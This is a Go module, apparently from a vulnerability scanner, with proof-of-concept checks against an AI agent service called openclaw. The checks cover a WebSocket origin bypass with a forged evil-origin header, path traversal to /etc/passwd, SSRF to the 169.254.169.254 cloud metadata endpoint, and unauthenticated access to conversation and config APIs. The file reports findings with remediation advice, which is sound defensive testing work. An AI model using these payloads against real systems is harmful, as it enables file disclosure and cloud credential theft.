package l3

import (
	"crypto/rand"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"strings"
	"time"

	"github.com/gorilla/websocket"
)

type PoCResult struct {
	Name        string
	CVEID       string
	Success     bool
	Severity    string
	CVSS        float64
	Description string
	Evidence    string
	Remediation string
}

func RunPoCs(ip string, port int, agentType string, timeout time.Duration) []PoCResult {
	if agentType != "openclaw" {
		return nil
	}

	var results []PoCResult
	results = append(results, pocWSOriginBypass(ip, port, timeout))
	results = append(results, pocPathTraversal(ip, port, timeout))
	results = append(results, pocSSRF(ip, port, timeout))
	results = append(results, pocUnauthAPI(ip, port, timeout))
	return results
}

// pocWSOriginBypass tests CVE-2026-25253: WebSocket connection without Origin header
// should be rejected. If accepted, the server is vulnerable to cross-site WS hijack.
func pocWSOriginBypass(ip string, port int, timeout time.Duration) PoCResult {
	result := PoCResult{
		Name:        "WebSocket Origin Bypass",
		CVEID:       "CVE-2026-25253",
		Severity:    "high",
		CVSS:        8.8,
		Remediation: "Upgrade to >= 2026.2.25 or enforce Origin header validation",
	}

	dialer := websocket.Dialer{
		HandshakeTimeout: timeout,
		NetDialContext:   (&net.Dialer{Timeout: timeout}).DialContext,
	}

	evilOrigin := fmt.Sprintf("http://evil-%s.example.com", randomHex(4))

	wsURL := fmt.Sprintf("ws://%s:%d/ws", ip, port)
	headers := http.Header{
		"Origin": []string{evilOrigin},
	}

	conn, resp, err := dialer.Dial(wsURL, headers)
	if err != nil {
		wsURL = fmt.Sprintf("ws://%s:%d/api/ws", ip, port)
		conn, resp, err = dialer.Dial(wsURL, headers)
	}
	if err != nil {
		result.Description = "WebSocket endpoint not reachable or connection rejected with foreign origin (good)"
		result.Evidence = fmt.Sprintf("dial error: %v", err)
		return result
	}
	defer conn.Close()

	result.Success = true
	result.Description = fmt.Sprintf("WebSocket connection accepted with malicious Origin '%s' - vulnerable to ClawJacked (cross-site WS hijack)", evilOrigin)
	result.Evidence = fmt.Sprintf("ws=%s origin=%s http_status=%d", wsURL, evilOrigin, resp.StatusCode)

	conn.WriteMessage(websocket.TextMessage, []byte(`{"type":"ping"}`))
	conn.SetReadDeadline(time.Now().Add(2 * time.Second))
	_, msg, readErr := conn.ReadMessage()
	if readErr == nil {
		result.Evidence += fmt.Sprintf(" recv=%s", truncate(string(msg), 100))
	}

	return result
}

// pocPathTraversal tests CVE-2026-26972: crafted skill path reads files outside skills dir.
func pocPathTraversal(ip string, port int, timeout time.Duration) PoCResult {
	result := PoCResult{
		Name:        "Path Traversal via Skill Paths",
		CVEID:       "CVE-2026-26972",
		Severity:    "high",
		CVSS:        7.5,
		Remediation: "Upgrade to >= 2026.3.2",
	}

	client := &http.Client{Timeout: timeout}

	traversalPaths := []string{
		fmt.Sprintf("http://%s:%d/api/skills/../../etc/passwd", ip, port),
		fmt.Sprintf("http://%s:%d/api/v1/skills/..%%2f..%%2fetc%%2fpasswd", ip, port),
		fmt.Sprintf("http://%s:%d/__openclaw/skills/..%%5c..%%5cetc%%5cpasswd", ip, port),
	}

	for _, url := range traversalPaths {
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := string(body)
		if strings.Contains(bodyStr, "root:") || strings.Contains(bodyStr, "/bin/") ||
			strings.Contains(bodyStr, "daemon:") {
			result.Success = true
			result.Description = "Path traversal allows reading system files (e.g., /etc/passwd)"
			result.Evidence = fmt.Sprintf("url=%s status=%d body_preview=%s", url, resp.StatusCode, truncate(bodyStr, 200))
			return result
		}

		if resp.StatusCode == 200 && len(body) > 0 && !isJSON(body) && !isHTML(bodyStr) {
			result.Success = true
			result.Description = "Path traversal returned unexpected content from outside skills directory"
			result.Evidence = fmt.Sprintf("url=%s status=%d content_length=%d", url, resp.StatusCode, len(body))
			return result
		}
	}

	result.Description = "Path traversal payloads were blocked or skills endpoint not found (good)"
	result.Evidence = "all traversal attempts returned 404/403 or expected content"
	return result
}

// pocSSRF tests CVE-2026-22234: agent SSRF by requesting internal metadata endpoints.
func pocSSRF(ip string, port int, timeout time.Duration) PoCResult {
	result := PoCResult{
		Name:        "SSRF via Agent Request Proxy",
		CVEID:       "CVE-2026-22234",
		Severity:    "high",
		CVSS:        7.5,
		Remediation: "Upgrade to >= 2026.2.14",
	}

	client := &http.Client{
		Timeout: timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	proxyEndpoints := []string{
		fmt.Sprintf("http://%s:%d/api/fetch?url=http://169.254.169.254/latest/meta-data/", ip, port),
		fmt.Sprintf("http://%s:%d/api/v1/proxy?target=http://169.254.169.254/", ip, port),
	}

	for _, url := range proxyEndpoints {
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := string(body)
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") ||
			strings.Contains(bodyStr, "instance-id") ||
			strings.Contains(bodyStr, "iam/") ||
			strings.Contains(bodyStr, "security-credentials")) {
			result.Success = true
			result.Description = "SSRF allows accessing cloud metadata endpoint (AWS/GCP/Azure)"
			result.Evidence = fmt.Sprintf("url=%s status=%d body=%s", url, resp.StatusCode, truncate(bodyStr, 200))
			return result
		}
	}

	payloadBody := `{"url":"http://169.254.169.254/latest/meta-data/"}`
	postEndpoints := []string{
		fmt.Sprintf("http://%s:%d/api/proxy", ip, port),
		fmt.Sprintf("http://%s:%d/api/v1/fetch", ip, port),
	}
	for _, url := range postEndpoints {
		resp, err := client.Post(url, "application/json", strings.NewReader(payloadBody))
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		bodyStr := string(body)
		if resp.StatusCode == 200 && (strings.Contains(bodyStr, "ami-id") || strings.Contains(bodyStr, "instance-id")) {
			result.Success = true
			result.Description = "SSRF via POST proxy allows accessing cloud metadata"
			result.Evidence = fmt.Sprintf("url=%s status=%d", url, resp.StatusCode)
			return result
		}
	}

	result.Description = "SSRF proxy endpoints not found or metadata access blocked (good)"
	result.Evidence = "proxy/fetch endpoints returned 404 or blocked internal requests"
	return result
}

// pocUnauthAPI tests if sensitive API endpoints are accessible without authentication.
func pocUnauthAPI(ip string, port int, timeout time.Duration) PoCResult {
	result := PoCResult{
		Name:        "Unauthenticated API Access",
		Severity:    "high",
		CVSS:        8.0,
		Remediation: "Configure authentication (token_auth or device_auth) for all API endpoints",
	}

	client := &http.Client{Timeout: timeout}

	sensitiveEndpoints := []struct {
		path string
		desc string
	}{
		{"/api/skills", "Skills enumeration"},
		{"/api/v1/skills", "Skills enumeration (v1)"},
		{"/api/conversations", "Conversation history"},
		{"/api/v1/conversations", "Conversation history (v1)"},
		{"/api/settings", "Agent settings"},
		{"/api/v1/config", "Agent configuration"},
	}

	var accessible []string
	for _, ep := range sensitiveEndpoints {
		url := fmt.Sprintf("http://%s:%d%s", ip, port, ep.path)
		resp, err := client.Get(url)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode == 200 {
			accessible = append(accessible, fmt.Sprintf("%s (%s)", ep.path, ep.desc))
		}
	}

	if len(accessible) > 0 {
		result.Success = true
		result.Description = fmt.Sprintf("%d sensitive endpoint(s) accessible without authentication", len(accessible))
		result.Evidence = "accessible: " + strings.Join(accessible, "; ")
	} else {
		result.Description = "All sensitive endpoints require authentication (good)"
		result.Evidence = "all tested endpoints returned 401/403/404"
	}

	return result
}

func randomHex(n int) string {
	b := make([]byte, n)
	rand.Read(b)
	return hex.EncodeToString(b)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

func isJSON(b []byte) bool {
	var v any
	return json.Unmarshal(b, &v) == nil
}

func isHTML(s string) bool {
	return strings.Contains(s, "<html") || strings.Contains(s, "<!DOCTYPE") || strings.Contains(s, "<HTML")
}
